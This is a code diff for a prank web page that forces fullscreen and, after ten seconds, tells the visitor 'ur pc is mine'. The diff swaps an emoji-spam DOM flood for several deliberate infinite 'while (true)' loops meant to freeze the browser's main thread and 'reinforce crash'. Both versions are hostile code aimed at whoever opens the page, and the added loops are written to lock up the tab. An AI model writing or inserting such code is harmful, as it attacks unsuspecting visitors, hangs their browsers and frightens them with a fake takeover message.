@@ -132,23 +132,20 @@
       document.documentElement.requestFullscreen().catch(console.warn);
     });
 
-    // 🔥 Chaos mode after 10 seconds
+    // Crash prank after 10 seconds
     setTimeout(() => {
       document.querySelector('.bounce-text').textContent = 'bye bye 👋';
       document.querySelector('.left').textContent = 'ur pc';
       document.querySelector('.right').textContent = 'is mine';
 
-      // DOM flood — emoji spam every 10ms
-      setInterval(() => {
-        const spam = document.createElement('div');
-        spam.textContent = EMOJI;
-        spam.style.position = 'absolute';
-        spam.style.left = `${Math.random() * 100}vw`;
-        spam.style.top = `${Math.random() * 100}vh`;
-        spam.style.fontSize = `${1 + Math.random() * 3}rem`;
-        spam.style.pointerEvents = 'none';
-        document.body.appendChild(spam);
-      }, 10);
+      // Run the infinite freeze loop multiple times in different ways to reinforce crash
+      for (let i = 0; i < 3; i++) {
+        // Slight delay between loops to confuse the browser a bit
+        setTimeout(() => {
+          // Freeze main thread indefinitely
+          while (true) {}
+        }, i * 10);
+      }
     }, 10000);
   </script>
 </body>
